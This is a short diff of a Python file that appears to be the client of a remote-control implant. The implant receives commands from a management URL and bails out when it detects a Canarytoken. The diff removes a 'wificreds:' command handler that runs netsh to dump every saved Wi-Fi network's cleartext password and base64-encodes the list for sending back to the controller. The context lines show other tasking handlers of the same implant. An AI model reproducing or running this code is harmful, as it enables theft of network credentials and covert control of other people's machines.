@@ -182,29 +182,6 @@ def connect(url,managementURL):
             #print("[+] Fallback Canarytoken Detected: ")
             main()
 
-        elif command.startswith("wificreds:"):
-            # Wifi credentials implementation in python https://nitratine.net/blog/post/get-wifi-passwords-with-python/
-            stringBuilder = "\n{:<30}|  {:<}".format("SSID","Pass") + "\n"
-            stringBuilder += "{:<30}|  {:<}".format("----","----") + "\n"
-            data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace").split('\n')
-            profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
-            for i in profiles:
-                try:
-                    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode(
-                        'utf-8',
-                        errors="backslashreplace").split(
-                        '\n')
-                    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
-                    try:
-                        stringBuilder = stringBuilder + ("{:<30}|  {:<}".format(i, results[0]) + "\n")
-                    except IndexError:
-                        stringBuilder = stringBuilder + ("{:<30}|  {:<}".format(i, "") + "\n")
-                except subprocess.CalledProcessError:
-                    stringBuilder = stringBuilder + ("{:<30}|  {:<}".format(i, "<ENCODING ERROR>") + "\n")
-            stringBuilder="res:"+stringBuilder
-            b64 = base64.b64encode(stringBuilder.encode('UTF-8'))
-
-
         # Adds command to #print working dir
         elif command.startswith("task:pwdtask:"):
             command = command.replace("task:pwdtask:", "")
